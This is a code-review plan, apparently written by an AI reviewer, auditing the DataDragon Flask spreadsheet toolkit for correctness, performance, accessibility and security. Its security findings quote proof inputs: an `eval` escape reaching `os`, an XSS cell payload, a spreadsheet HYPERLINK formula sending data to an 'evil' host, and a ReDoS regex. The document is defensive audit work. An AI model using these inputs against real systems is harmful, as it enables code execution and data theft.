# REVIEW_PLAN.md — DataDragon v4

Reviewed: 2026-10-03 · Commit `bff690b` (cloned from `github.com/TamReversed/DataDragonV2.1`) · Reviewer: Claude (Opus 5.5) with 5 parallel audit subagents

---

## 1. Executive summary

DataDragon is a Flask + pandas toolkit for preparing spreadsheet data, mainly for ERP data loads. It has 16 tools and a 5-stage Data Readiness Pipeline, all in one 7,180-line `datadragon.py` plus large Jinja templates. Its breadth and dark "glass" UI make a strong first impression. The golden path works: upload, then preview, then analyse, then download.

Underneath, it is not yet trustworthy for the data it is aimed at:

- **Wrong numbers.** Several tools silently produce wrong numbers or lose data:
  - leading zeros are stripped on every read
  - merge joins blank keys to each other and reports negative counts
  - the pivot drops blank-key rows from totals
  - the normalizer turns `2,5` into `25` and overwrites unparseable dates with blanks
- **Security holes.** The formula tool lets anyone run code on the server through `eval` (proven). A global file cache lets any client list and download other users' processed files (proven with an SSN).
- **Concurrency failures.** Two jobs started in the same second destroy each other (proven). The app breaks under gunicorn with more than one worker, or on any job longer than 30 s with sync workers. There are no tests, no CI and no deploy config.

The **three biggest opportunities** are cheap relative to their impact:

1. A golden-dataset test suite plus lossless (string-preserving) file reading. This fixes the largest class of correctness bugs in one change.
2. Per-browser job ownership plus an AST-based formula evaluator. This closes all three P0 security findings without adding user accounts.
3. Vectorising compare, duplicate-finder and validator. This takes 100k-row jobs from minutes (compare: 391 s) to seconds.

**Overall readiness: 1.7 / 5.** It is a good demo, but not safe for real or sensitive data until Phases 0–1 below are complete.

---

## 2. What I inferred

The `{{VARIABLES}}` block was not filled in, so everything below is inferred from the code and docs and should be confirmed by the owner.

| Item | Inference | Basis |
|---|---|---|
| Name | DataDragon (v4 fork of "DataDragon V2.1") | `templates/landing.html`, repo name |
| Purpose | Self-service prep for spreadsheet data: profile, clean, de-duplicate, find natural keys, anonymise, merge, compare, pivot, validate, split for ERP loads, plus a guided "Data Readiness Pipeline" that produces a PDF report | Routes in `datadragon.py:419-6290`; landing page |
| Users | ERP data-migration and ops analysts working in Excel. They are not developers and are not notebook users. | `PROJECT_SUMMARY.md:14-16, 277-283` ("ERP data loads", 40k-row chunks) |
| Data sensitivity | **High.** `PROJECT_SUMMARY.md:379` says *"Internal project for Proven Optics / US Navy ERP Data Management"*. Expect PII and possibly CUI. | Docs; scrubber/anonymiser feature exists |
| Stack | Python, Flask 3.0.0, Werkzeug 3.0.1, pandas (unpinned `>=2.2.0` installs **3.0.6** today), openpyxl, reportlab, pdf2docx, gunicorn. Front end: Jinja + vanilla JS, Chart.js 4.4.0, jsPDF and html2canvas from CDNs. No database. All state is in-process dicts. | `requirements.txt`, `datadragon.py:1-30, 34-41, 103, 201` |
| Hosting | **Unknown.** `__main__` binds `127.0.0.1:5002` (`datadragon.py:7179`), and `security_info.html` claims "localhost only". But `gunicorn` is a dependency. There is no Procfile, Dockerfile or CI. | Repo contents |
| Volume | Up to 500 MB uploads (`datadragon.py:49`), about 5M rows. Docs cite 1M-row files. | Config, docs |
| Benchmarks | None named. The functional peers are **OpenRefine, Alteryx Designer, Excel Power Query and Trifacta/Google Dataprep**. Hex, Observable, Mode and Tableau set the bar for polish and trust, but they are different categories (notebook/BI). | Inference |

**Could not verify:**

- The real deployment target or user count.
- Correctness of the PDF→Word tool (pdf2docx wrapper; not audited).
- Behaviour on Windows.
- Browser golden paths other than Column Analyzer and the landing page. I exercised those two in a real browser; other tools were exercised through Flask `test_client` and direct function calls.
- Perf numbers on pandas 2.x. All measurements ran on pandas 3.0.6, because that is what the unpinned requirement installs. Re-baseline in T0.6.
- Whether the owner controls the upstream GitHub repo. Its `origin` points at `TamReversed/DataDragonV2.1`.

**Commands run during the review** (venv at Python 3.14.5):

- `pip install -r requirements.txt pytest pyflakes pip-audit`: OK, installed pandas 3.0.6.
- `python -m pyflakes datadragon.py`: **34 warnings**, including **1 undefined name** (`get_cached_file`, L5863).
- `pip-audit -r requirements.txt`: **14 known vulnerabilities**, in Flask 3.0.0 and Werkzeug 3.0.1.
- Tests: **none exist**.
- `test_client` GET of all 23 page routes: all 200.
- `gunicorn -w 4`: 6 of 8 analyse→progress round trips failed with "Session not found".
- `pip download 'pandas<3'`: a cp314 wheel exists (2.3.3), so pinning works on the owner's Python 3.14.
- `python -c "import xlrd"`: **ModuleNotFoundError**, so `.xls` uploads cannot work.

---

## 3. Scorecard

| Dim | Area | Score | Top evidence | Target |
|---|---|---|---|---|
| A | Data correctness & trust | **1** | Leading zeros lost on every read (A-01); merge joins NaN keys and reports negative counts (A-02/03); pivot drops blank keys from totals (A-06); normalizer corrupts decimals and dates (A-08) | 4 |
| B | Analytical capability | **3** | 16 tools is real breadth; sound natural-key search (Apriori-style pruning); but single sheet only, broken pivot filters, no recipe/replay | 4 |
| C | Visualization | **2** | Chart.js on 2 of 18 pages; quantile "distribution" drawn as bars with non-zero baseline (`column_analyzer.html:2246-2311`); no colour-blind-safe palette; no chart export | 4 |
| D | UX & workflow (incl. WCAG 2.2 AA) | **2** | Good previews and error copy; but uploads are not keyboard-operable on any tool (`main.css:545`); 0 `aria-live`; muted text 3.8:1; Splitter page uses a different design system | 4 |
| E | Performance & scalability | **2** | Compare is O(n²) (100k rows: **391 s**); pivot at 500k: **93 s / 5.8 GB**; validator `iterrows` at 500k: **3.55 GB**; logo is a 13,728×8,333 px PNG | 4 |
| F | Architecture & code health | **2** | One 7,180-line module; about 17% boilerplate across 13 `*_async` fns; about 12.8k lines of inline CSS; `escapeHtml` defined 17×; no locks on shared dicts | 3 |
| G | Security & privacy | **1** | `eval` RCE (L6044, proven); global cross-user cache/download IDOR (proven); 14 CVEs; formula injection in exports; false claims on the security page | 4 |
| H | Reliability & operability | **1** | Same-second job collision deletes another job's files (proven); fails with multiple workers or sync timeouts; cleanup thread can die; `print` logging; no deploy config | 4 |
| I | Testing | **1** | No tests, no CI, no golden data | 4 |
| J | Product polish & positioning | **2** | Strong visual identity, but the README and PROJECT_SUMMARY describe a non-existent `app.py`; security page over-promises; a 1 MB hero logo; orphaned splash | 4 |

---

## 4. Findings

Line numbers refer to `datadragon.py` unless a file is named. "Proven" means it was reproduced with a script or `test_client` during review. Repro scripts are summarised in the task verification steps.

### A — Data correctness & trust

**A-01 · P0 · Leading zeros and text-typed values are converted to numbers on every read (proven).**
- Evidence:
  - `read_data_file` L265 and L275, `split_excel_file` L387, and about 36 direct `read_excel`/`read_csv` calls (e.g. L1419, L2378, L2893, L3211-3221, L3512-3522, L3857, L5412).
  - An xlsx *text* cell `'00123'` reads as int `123`. The splitter writes it back as a numeric cell, so the split files are corrupted.
  - A CSV id `9007199254740993` with a blank row becomes float `9007199254740992.0`.
- Root cause: pandas type inference is applied to tools that should pass data through unchanged.
- Recommendation: add a lossless read mode and use it everywhere data passes through or keys are matched. Convert to numbers explicitly only where maths happens (see T1.5).

**A-02 · P0 · Merge joins blank keys to each other (proven).**
- Evidence: L3279. Left ids `[1,NaN,NaN]` inner-joined with right `[1,NaN,NaN]` gives 5 rows; expected 1.
- Root cause: pandas `merge` matches NaN to NaN.
- Recommendation: exclude null keys from matching. Re-append them as unmatched for left/outer joins.

**A-03 · P0 · Merge statistics are wrong, including negative counts; row multiplication is silent (proven).**
- Evidence: L3296-3312, L3263-3286.
  - When `left_key == right_key`: 3 left rows with 1 match report `matched=3, unmatched_right=-2`.
  - With `keep_all` and duplicate keys: `unmatched_left=-3`.
- Root cause: the coalesced key column is checked with `notna()`, and counts are computed by subtracting row totals.
- Recommendation: use `merge(indicator=True)`, count distinct unmatched keys with `isin`, and report the row-multiplication factor with a warning.

**A-04 · P0 · Data Comparison mis-keys rows (proven).**
- Evidence:
  - L3569-3570: `str(1)` vs `str(1.0)`. A blank in one file's key column turns the column to float, so `common=0, added=3, removed=2`; expected 2/1/0.
  - L3573-3579: a null key is reported as both added and removed.
  - L3596-3597: only the first row per duplicate key is compared.
- Root cause: string-concatenated composite keys built from inferred dtypes, and Python sets with NaN.
- Recommendation: rewrite as a merge on the real key columns (read as text), with explicit duplicate-key and null-key reporting. Shares the rewrite with E-01.

**A-05 · P0 · Duplicate Finder reports false duplicates (proven).**
- Evidence: L2405-2411. Rows `a='x|||y', b='z'` and `a='x', b='y|||z'` are grouped and ID 2 is listed in "IDs to Remove". NaN and `''` also collapse together.
- Root cause: a `'|||'.join` row signature.
- Recommendation: `df.duplicated(subset, keep=False)` plus `groupby(subset, dropna=False)`. Also fixes E-02.

**A-06 · P0 · Pivot drops rows with blank row or column keys from cells and Total; shows 0 for empty mean/min/max cells (proven).**
- Evidence: L3905. Regions `N=10, S=5, blank=100` give `Total=15`.
- Root cause: `pivot_table` defaults to `dropna=True` and is called with `fill_value=0` for every aggregation.
- Recommendation: label blanks as `(blank)` and use `fill_value=0` only for sum and count.

**A-07 · P0 · Anonymizer (relationship mode) leaks original PII (proven).**
- Evidence: L1654-1659, L1728-1730. With Name=[Alice,Bob,Carol] and Email=[a@x,NaN,c@x], Name becomes `['Name_1','Bob','Name_2']`, so "Bob" is exported in clear.
- Also (P1):
  - Mixed types collapse: `1`, `True` and `1.0` all become `Code_1` (L1760, L1774).
  - The exported mapping is lossy (L1690).
  - Raw PII is printed to stdout (L1737, L1763-1859, L1914-1967).
- Root cause: a composite-key lookup falls back to the original value when any part is NaN.
- Recommendation: map each column's non-null values independently, never fall back to originals, normalise to strings before mapping, export the mapping as records, and delete the value-printing debug code.

**A-08 · P0 · Column Normalizer corrupts numbers and dates (proven).**
- Evidence: L4683-4771.
  - `"2,5"` becomes **25**; `"1.234,56"` becomes **1.23456**.
  - Integer mode truncates `3.7` to `3` (L4692).
  - Percentage mode turns `0.5` into **0.005**.
  - Dates: `['01/02/2024','2024-03-05']` becomes `[2024-01-02, NaT]`. The original is **overwritten** with NaT.
  - L4827 applies Excel number formats to the wrong columns (P1).
- Root cause: blind comma stripping, no locale or date-order parameter, and `errors='coerce'` written back over originals.
- Recommendation: explicit locale and date-order inputs. Never overwrite a value that fails to parse; keep it and count it. Use the `Int64` dtype and reject non-integral values. Divide by 100 only when `%` is present. Use `df.columns.get_loc` for formats.

**A-09 · P1 · Pipeline and Natural Key Finder overstate what they did.**
- Evidence:
  - The pipeline logs and reports "Normalization: N columns affected", but nothing is applied. `gap_handling` is ignored. The UI promises "realistic fake names / hashed / bucketed", but produces `NAM_00001` (L6929-6938, L6759-6770, L7162).
  - Natural keys are computed *after* `drop_duplicates`, then reported as "uniquely identifies each row" (L6555-6557, L7119).
  - The Unique-ID tool's export silently drops duplicate rows (L2905, L3060) and accepts a nullable column as a key (L2932, L2995).
- Root cause: features stubbed in the UI and report but not implemented, and uniqueness tested on de-duplicated data.
- Recommendation: report only what was executed ("recorded, not applied" for the rest). Test uniqueness on the full data and show the duplicate count. Export all rows with a duplicate flag. Reject nullable key candidates by default.

**A-10 · P1 · Data Validation gives wrong verdicts.**
- Evidence:
  - String range bounds raise TypeError, which `except: pass` swallows, so 5 passes `1..3` and `"abc"` passes too (L4420).
  - The pattern rule uses `re.match`, so `\d{5}` accepts `123456789`.
  - "Total Errors" counts rows, not errors.
  - Reported row numbers are `idx+1` (header offset ignored).
- Recommendation: cast bounds to float, flag non-numeric values, use `fullmatch`, count errors, report spreadsheet row = `idx+2`. Rewrite vectorised (E-04).

**A-11 · P1 · Semantic type detection mislabels common columns (proven in UI).**
- Evidence:
  - The Column Analyzer labels `ID` (`PR-00001`) and two other columns as **Postal Code**.
  - Confidences reach 200% because overlapping pattern masks are summed (L1025-1027, L1096-1098).
  - The postal regex `^[A-Z0-9\s-]{3,10}$` matches ids and ISO dates.
  - `^USD|EUR|...$` has a precedence bug.
  - On pandas 3, `infer_datetime_format=` raises inside a bare except, so date detection is dead (L991, L1353).
- Recommendation: OR the masks and clamp to 100. Detect dates before postal codes. Fix the regexes. Remove the deprecated kwarg.

**A-12 · P1 · Output depends on which pandas major version gets installed.**
- Evidence: `requirements.txt` has `pandas>=2.2.0`, which installs 3.0.6 today. On pandas 3:
  - Transpose crashes (L5438, read-only `columns.values`).
  - CONCAT with NaN raises.
  - Normalizer conversions all error out.
  - Date detection dies (A-11).
- Recommendation: pin `pandas>=2.2,<3` now (decision D2). A pandas 3 migration is a separate, test-guarded task.

**A-13 · P1 · Text tools corrupt blanks and mis-handle patterns (proven).**
- Literal `"nan"` is written into blank cells: L4677/4680, L5797-5816, merge-column, CONCAT. Row Filter `equals "nan"` matches blanks.
- Whole-cell regex `^{find}$` with `A|B` replaces `Axx` (L5758).
- Case-insensitive literal mode treats `replace_text` as a regex template (L5816).
- Column split on `" | "` is treated as regex (L6187).
- Rename can create duplicate column names (L6126).
- Reorder silently drops unlisted columns (L6107).

**A-14 · P1 · Only the first sheet is ever read; the splitter silently drops sheets 2+ (proven).** L275, L387 and every reader.

**A-15 · P1 · Outputs over 1,048,576 rows fail to write; transpose over 16,383 rows fails.** L3345, L4012, L3060, L5451. No pre-check; the error surfaces late.

**A-16 · P2 · CSV encoding fallback is ineffective.**
- `latin-1` decodes anything, so `cp1252` is never reached and `“Quoted”,€5` is mojibake (L262-271).
- A broad `except Exception: continue` hides parser errors.
- Most tools bypass `read_data_file` altogether (see A-01).

**A-17 · P2 · Preview total-row count is wrong for CSVs with multi-line cells (L322-324); the preview upcasts ints to floats (L332).**

**A-18 · P2 · `make_json_serializable` emits invalid JSON `NaN` and fails on numpy arrays containing NaN (L875-886).**

**A-19 · P1 · Pivot filters always crash (proven).** L3864 concatenates a list with a dict and raises `TypeError`. L3875 then compares numbers to strings, so even a fixed filter matches nothing on numeric columns.

**A-20 · P2 · Row Filter has no AND/OR precedence; failed numeric comparisons fall back to lexicographic order** ("10" < "9"). `ROUND(2.5)`=2 (banker's rounding; Excel gives 3). `RIGHT(x,0)` returns the whole string. Column Comparison reads CSV and Excel headers differently (L5165-5173).

**A-21 · P1 · Column analysis crashes on any boolean column (proven).** L1306-1309: `is_numeric_dtype(bool)` is True, then IQR subtraction raises, and the whole analysis fails.

**A-22 · P1 · `.xls` is advertised and accepted (`ALLOWED_EXTENSIONS`, L226) but `xlrd` is not a dependency (verified).** Every `.xls` upload fails with an engine error.

### B — Analytical capability

**B-01 · P2 · No reproducible "recipe" across tools.**
- Tools chain through a cached-file list, but nothing records which transformations produced a file, and there is no undo.
- The cached-file "use" action downloads the whole file to the browser and re-uploads it (`column_analyzer.html:1371-1380`).
- Recommendation (scoped):
  - Pass `cache_id` to the server instead of the bytes.
  - Add a per-file transformation log (tool, parameters, timestamp, row counts in/out), written into each output, e.g. an `_DataDragon_Log` sheet or a sidecar JSON.
  - Full replay is out of scope (Section 9).

**B-02 · Already good.**
- The 16-tool breadth suits ERP load prep: splitter, natural-key finder, readiness report.
- The natural-key search is algorithmically sound: it only tests supersets of non-unique subsets, so the keys it returns are minimal.
- Data previews are shown before a run.
- Keep all of these.

### C — Visualization

**C-01 · P1 · The "Distribution" chart is misleading.** `column_analyzer.html:2246-2311` draws Min/Q25/Median/Q75/Max as *bars* with `beginAtZero:false`, so bar length encodes nothing and the direction flips for negative values. Replace it with a horizontal box/range strip (whiskers, IQR box, median tick) on a linear axis.

**C-02 · P2 · Colour is not colour-blind safe and hidden legends make it unreadable.**
- Evidence:
  - Green, cyan and purple encode thresholds with the legend hidden (`data_readiness_pipeline.html:2560-2574`).
  - Doughnut charts slice a rainbow palette (`:2066-2076, :2485`).
  - The missing-data chart forces every label at 45° (`:2236-2238`), which is unreadable past about 30 columns.
- Recommendation: one shared chart theme using the Okabe-Ito palette, a visible legend or key wherever colour encodes a class, and a sorted horizontal bar with top-N for many columns. Replace type-count doughnuts with a sorted bar.

**C-03 · P2 · No chart export; the Column Analyzer PDF is text-only (`column_analyzer.html:2420+`).** html2canvas is loaded but unused there, and a different build is loaded from another CDN in `column_comparison.html:1368`. Add "Download PNG" (`chart.toBase64Image()`), embed the charts in the PDF, and use one html2canvas version or none.

**C-04 · P2 · Canvas IDs collide.** `colName.replace(/[^a-zA-Z0-9]/g,'_')` maps "a b" and "a_b" to the same id, so charts render into the wrong card (`column_analyzer.html:2067, 2098`). Use the column's index.

**Already good:** the missing-data and uniqueness charts use honest 0–100% axes, and the categorical chart is a sorted horizontal bar with a zero baseline.

### D — UX & workflow

**D-01 · P1 · File upload is impossible by keyboard on every tool page.** The drop zone is a `<div onclick>` and the `<input type=file>` is `display:none` (`main.css:545-546`, `column_analyzer.html:1044-1051`). Across all templates there are 0 `role=`, 0 `tabindex` and 0 `aria-live`. The cached-file rows, the theme toggle and the remove-file control are also non-focusable divs or spans. This fails WCAG 2.1.1.

**D-02 · P2 · Focus, status announcements and contrast fail WCAG.**
- Focus: `outline:none` with no `:focus-visible` replacement (`main.css:327`, `landing.html:424`). Fails WCAG 2.4.7.
- Status: progress and errors are not announced to screen readers. Fails WCAG 4.1.3.
- Contrast:
  - `--text-muted` (rgba 255,255,255,.4 on #0a0a0f) is about 3.8:1.
  - White on the primary gradient is 3.7–3.9:1.
  - Both fail WCAG 1.4.3.

**D-03 · P2 · Motion ignores `prefers-reduced-motion`.** Four 80px-blurred animated orbs plus `backdrop-filter` run behind every page (`main.css:110-154, 263`). Fails WCAG 2.3.3 and costs GPU.

**D-04 · P2 · The progress client is brittle.**
- `onerror` only handles the CLOSED state, so it retries forever silently (`column_analyzer.html:1768-1773`).
- `response.json()` runs before `ok` is checked, so a 413 or 500 shows "Unexpected token <" (`:1640`).
- `alert()` fires on top of the inline error (`:1546`).
- Cancel only closes the stream; the server job keeps running (`:1475-1486`).
- The pattern is copy-pasted into about 15 templates.

**D-05 · P2 · The Excel Splitter (`templates/index.html`) is a different product visually.** It doesn't extend `base.html`, has its own palette and font stack, and has a "Classic / Future (beta)" theme playground with blob colour pickers (`:955-990`).

**D-06 · P2 · The pipeline loses its session on refresh; the preview is a stub; the copy is inconsistent.**
- The preview fetches `/state` and ignores the response (`data_readiness_pipeline.html:2253-2264`).
- The landing card says "5-stage" but the stepper shows 6 (`:1522-1549`).

**D-07 · P3 · Friction observed in the browser.**
- After selecting a file, the drop zone shows only "File size: 56.4 KB", not the file name.
- The preview table's inner scroll captures the mouse wheel.
- The hub has 18 cards with no search.
- Tool names don't match routes ("Data Anonymizer" → `/data-scrubber`, "Natural Key Finder" → `/unique-identifier-finder`).

**D-08 · P3 · Eight templates have no responsive rules of their own** (column_operations, data_validation, find_replace, row_filter, pdf_to_word, duplicate_finder, security_info, index).

**Already good:**
- Previews before every run.
- Specific, actionable error copy (memory, timeout, size).
- A consistent token system in `main.css:4-73`.
- `lang="en"` and viewport set in `base.html`.
- A sensible heading hierarchy.

### E — Performance & scalability

Baselines below were measured on pandas 3.0.6 (owner's Mac, Python 3.14.5), with synthetic data: 15 mixed columns.

| Operation | 10k | 100k | 500k |
|---|---|---|---|
| read csv | 0.01 s | 0.09 s | 0.41 s / 358 MB |
| read xlsx | 0.67 s | 6.4 s | 31.4 s / 716 MB |
| write xlsx | 0.67 s | 6.9 s | 34.3 s |
| `analyze_dataframe` | 0.09 s | 0.49 s | 2.3 s |
| unique-id finder, 12 cols | — | 8.5 s / 855 MB | 48.8 s / 3.6 GB |
| duplicate finder, high cardinality | 0.24 s | **49 s** | ~20 min (proj.) |
| pivot (24-cell output) | 1.7 s | **18 s / 1.4 GB** | **93 s / 5.8 GB** |
| validator | 0.83 s | 8.7 s / 738 MB | 46.7 s / **3.55 GB** |
| compare, 1 key | 5.4 s | **391 s** | ~2.7 h (proj.) |

**E-01 · P1 · Compare is O(n²).** L3593-3595: two full boolean scans per key inside a loop over keys. Fix by rewriting as a merge (shared with A-04).

**E-02 · P1 · Duplicate Finder is O(n·groups).** A row-wise `apply` at L2411, then a full scan per group at L2427. Fix with the `duplicated`/`groupby` approach (shared with A-05).

**E-03 · P1 · Pivot writes, reloads and re-saves the entire source data.**
- L4012 writes the full source data to a "Source Data" sheet.
- L4022 `load_workbook`s the whole file.
- L4158-4177 walks every cell to set widths.
- Fix: style through `writer.sheets` before closing, make the source sheet optional (default off above 100k rows), and size widths from a sample.

**E-04 · P1 · Validator runs `iterrows` × rules with per-row dicts (L4378).** Fix with one vectorised boolean mask per rule.

**E-05 · P1 · The natural-key search can explode combinatorially, and the pipeline runs it on *all* columns by default.**
- L2946-3009 is duplicated at about L6560-6640; the pipeline default is at L6529.
- 20 columns → 21.7k candidates; 30 columns → 174k.
- Subset membership is checked against a `list`.
- Fix:
  - Factor the search into one function.
  - Hold the non-unique subsets in a `set`.
  - Pre-filter columns.
  - Cap candidates and wall-time, and report when a cap is hit.
  - Screen candidates on a sample, then confirm on the full data.

**E-06 · P2 · xlsx I/O is the dominant cost (about 65–70 µs/row each way).** `get_file_preview` parses the whole xlsx just to count rows (L326). Use openpyxl `read_only` `max_row` for counts, and xlsxwriter for writes (see G-06).

**E-07 · P2 · The logo PNG is 13,728×8,333 px (1.09 MB) but displayed at 64 px** (`static/images/datadragon-logo.png`, `landing.html:39-41`). Decoding it costs about 450 MB of RGBA memory per page.

**E-08 · P2 · Always-on blur and backdrop-filter animation on every page** (`main.css:110-154, 263`). Covered by D-03.

### F — Architecture & code health

**F-01 · P2 · One 7,180-line module with about 1,200–1,300 lines of copy-paste boilerplate.**
- 13 `*_async` functions, each with its own `send_progress`, final-message `put` and fallback, and error cleanup.
- 16 routes, each repeating save, queue, thread and return.
- 5 `iterrows` preview serialisers.
- No locks around the 5 shared dicts.
- Recommendation: extract a job runner, an upload-route helper and a `df_preview()` helper. Do this only after tests exist (Phase 3).

**F-02 · P2 · Front-end duplication.**
- Templates carry 170–1,480 lines of inline `<style>` (about 12.8k total) and 270–1,380 lines of inline `<script>`.
- `escapeHtml` is defined 17×.
- Upload, cached-files, SSE and modal code is copied into every tool.
- Recommendation: `static/js/common.js` plus component CSS in `main.css`.

**F-03 · P3 · Dead code and stale files.**
- pyflakes reports 34 warnings: unused imports, about 19 placeholder-less f-strings, unused locals, and duplicate imports at L7018/L7023.
- `Data Split.py` duplicates `split_excel_file`.
- `create_test_file.py` duplicates `/generate-test-file`.
- `templates/splash.html` is not routed (with a 2.2 MB mp4).
- `static/images/datadragon-logo_old.svg` is unused.

**F-04 · P2 · The docs are wrong.** `README.md` and `PROJECT_SUMMARY.md` describe an "Excel File Splitter" with `app.py` on port 5000. Neither exists; the app is `datadragon.py` on port 5002.

### G — Security & privacy

**G-01 · P0 · Remote code execution through the Calculated Columns formula (proven).**
- Evidence:
  - L6044 runs `eval(formula_work, {"__builtins__": {}}, safe_namespace)`, and the namespace contains `pd` and `np` (L6033-6038).
  - The formula `pd.io.common.os.getcwd()` returned the server's working directory, so `os.system` is reachable.
  - The route reads multipart form fields with no CSRF or Origin check. Any web page could therefore probably trigger it with `fetch(..., {mode:'no-cors'})` while the app runs locally (drive-by). **That drive-by path was not proven in a browser.**
- Root cause: an empty `__builtins__` is not a sandbox.
- Recommendation: an AST allow-list evaluator with no attribute access and no modules in scope, plus a same-origin check on POSTs.

**G-02 · P0 · Global file cache = cross-user data disclosure (proven).**
- Evidence:
  - `file_cache` is process-global (L103).
  - `/get-cached-files` (L2198) lists every user's files.
  - `/download-cached-file/<id>` (L2266) and `/use-cached-file` (L2233) serve any id, and the latter returns the absolute server path.
  - Proven: a second client downloaded a victim's Find & Replace output containing `123-45-6789`.
- Recommendation: bind every job, cache entry and download to an owner id (signed session cookie); return 404 for non-owners.

**G-03 · P0 · `/download/<filename>` serves any output to anyone; anonymisation mapping keys have guessable names.**
- Evidence:
  - L817-865 has no ownership check.
  - `mapping_key_{YYYYmmdd_HHMMSS}.json` (L1981-1984) contains every original value, and its name is guessable to the second.
- Path traversal *is* handled correctly (L820-828).
- Recommendation: same owner binding as G-02, plus random job-scoped names.

**G-04 · P1 · Stored XSS and PDF markup injection.**
- `column_analyzer.html:2090` and `:2152` interpolate cell values (`${value}`) into `innerHTML` without `escapeHtml`. A spreadsheet cell `<img src=x onerror=…>` runs script, and the shared cache (G-02) makes this cross-user.
- Pipeline PDF: column names go raw into reportlab `Paragraph` (L7038, L7090, L7117). A column `a<b` crashes the report.
- Recommendation: escape both, and audit all `${` inside `innerHTML` templates.

**G-05 · P1 · 14 known CVEs in pinned Flask 3.0.0 and Werkzeug 3.0.1** (`pip-audit`). They include a multipart-parsing DoS and `safe_join` issues. Fix: `Flask>=3.1.3`, `Werkzeug>=3.1.6` (a minor-version bump).

**G-06 · P1 · Formula/CSV injection in exports (proven).** A cell `=HYPERLINK("http://evil/?"&A2,"x")` round-tripped through Find & Replace comes out as a live formula (`data_type == 'f'`).

**G-07 · P1 · ReDoS (proven).** User regex goes straight into `.str.replace`/`.str.count` (L5758, L5787-5799) and the validation pattern (L4436). `(a+)+$` against a 29-character cell took 10.7 s of CPU.

**G-08 · P1 · Data retention contradicts the Security page; PII is written to logs.**
- Outputs persist until downloaded, or forever for non-cached outputs.
- `templates/security_info.html` makes claims the code doesn't keep:
  - "never leave your computer" (`:214`)
  - "deleted immediately" (`:280`, `:455`)
  - "no traces … remain" (`:293`)
- PII is printed to stdout (see A-07).

**G-09 · P2 · The rate limiter becomes one global bucket behind a proxy.**
- It is keyed only by `remote_addr` (L41, L56-74) and shared across all 23 decorated routes.
- Proven: 10 hits on one route caused `/analyze` to return 429.
- The store never evicts IPs, and each gunicorn worker keeps its own count.

**G-10 · P2 · No security headers, CSRF protection or cookie flags; most CDN scripts lack SRI** (`column_analyzer.html:6-8`).

**G-11 · P2 · 33 handlers return `str(e)` to the client** (e.g. L815, L5696). Internal paths and exception text are disclosed.

**G-12 · P3 · Large upload limit (500 MB) and no row/cell caps before a full parse.** This leaves the app exposed to xlsx decompression bombs.

### H — Reliability & operability

**H-01 · P0 · Jobs started in the same second destroy each other (proven).**
- The splitter uses `OUTPUT/<YYYYmmdd_HHMMSS>` as its work dir and `split_files_<ts>.zip` as its output, then `shutil.rmtree`s the dir (L687, L705, L791).
- Proven: Alice's and Bob's concurrent uploads produced `ALICE done … BOB error: Cannot save file into a non-existent directory`.
- Other outputs use the same second-resolution names: `duplicates_`, `anonymized_`, `validation_`, `normalized_`, `mapping_key_` and `data_readiness_report_` (e.g. L2478, L1981).
- These collisions can also hand one user another user's file.

**H-02 · P0 if hosted, P2 if localhost-only · The app breaks under any realistic WSGI deployment (demonstrated).**
- All job state lives in per-process dicts (L34, L38, L41, L103, L201). With `gunicorn -w 4`, 6 of 8 progress streams said "Session not found".
- With default sync workers, the SSE stream holds the worker and the job thread dies at the 30 s worker timeout (SIGKILL observed).
- There is no Procfile, Dockerfile or CI, and `__main__` ignores `$PORT`.

**H-03 · P1 · Unbounded growth, and a cleanup thread that can die silently.**
- One thread per request with no pool (17 `threading.Thread` sites).
- Pipeline sessions keep full DataFrames for 2 h with no cap (L168, L203).
- `progress_queues` leak if a client never connects.
- `output/` is never swept.
- `cleanup_thread` (L89-94) has no try/except and iterates dicts that other threads mutate (L81, L144, L207), so "dictionary changed size" kills it permanently.

**H-04 · P1 · Calculated Columns crashes whenever a cached file is used (proven).** L5863 calls the undefined `get_cached_file`, and L5867 reads `cache_info['filename']` where the key is `'name'`.

**H-05 · P1 · Pipeline state bugs.**
- `execute` crashes if analysis was skipped (L7044: `stage_data.get(1, {})` returns None).
- Re-running a stage doesn't invalidate later stages.
- A previous SSE generator deletes the *next* stage's queue (L667-669).
- The pipeline zip is cached under a `_data.xlsx` name pointing at a `.zip`, then deleted on first download (L6978-6985).

**H-06 · P2 · The SSE generator's bare `except:` swallows `GeneratorExit` on client disconnect (L617-659).**

**H-07 · P2 · No structured logging, health check or metrics.** There are 247 `print` calls and 42 `traceback` prints, with no `logging`.

**H-08 · P2 · Each output can be downloaded only once.** `/download` deletes the file after the first response (L841-863), so a retry, a second click or a browser re-download fails.

### I — Testing

**I-01 · P1 · Zero automated tests, no CI and no golden datasets.** Every bug in A was reachable because nothing checks the numbers.

### J — Product polish & positioning

**J-01 · P2 · First impression is strong (landing hub, consistent dark brand, "Generate Test File" demo seed), but trust signals undercut it.**
- The README describes a different app (F-04).
- The Security page over-promises (G-08).
- A 1 MB logo (E-07) and an orphaned splash/mp4 (F-03).
- Positioning: the defensible niche against OpenRefine, Power Query and Alteryx is **"ERP-load readiness with an auditable report"**, i.e. the pipeline, natural keys, splitter and PDF. That only wins if the numbers and the report are provably right (A-09), so correctness work *is* the positioning work.

---

## 5. Decisions for the owner

Answer inline. If a decision is left blank, execution proceeds with **the recommended default in bold**.

| # | Decision | Options | Recommended default |
|---|---|---|---|
| D1 | **Deployment model.** Is DataDragon run (a) only on the analyst's own machine, or (b) hosted for several users (e.g. Railway)? If the data is Navy/CUI, confirm hosting is even permitted. | (a) localhost · (b) hosted multi-user | **Build for (b)-safe behaviour (owner isolation, CSRF/Origin checks, single-worker gthread Procfile) but keep binding 127.0.0.1 by default.** Do not deploy anywhere until the owner confirms the data-handling rules. User accounts/SSO stay out of scope. |
| D2 | pandas major version | Pin `<3` now · Migrate to pandas 3 now | **Pin `pandas>=2.2,<3`** (2.3.3 has Python 3.14 wheels). pandas 3 migration is a later, separate task. |
| D3 | Lossless reading changes outputs. For example, split files will keep `00123` as text where they used to write number `123`. | Accept · Keep old behaviour behind a toggle | **Accept.** Pass-through tools preserve cell values and types exactly. |
| D4 | Formula language for Calculated Columns | AST allow-list keeping today's syntax and functions · Drop the feature | **AST allow-list**, same syntax. Any formula using `pd.`/`np.` directly stops working (that was the exploit surface). |
| D5 | Excel Splitter "Classic/Future" theme playground | Remove and rebuild the page on `base.html` · Keep | **Remove** (feature removal: confirm). |
| D6 | Delete orphaned/stale files: `splash.html`, the 2.2 MB mp4, `datadragon-logo_old.svg`, `Data Split.py`, `create_test_file.py`, `PROJECT_SUMMARY.md` | Delete · Keep | **Delete** (confirm in Phase 4). |
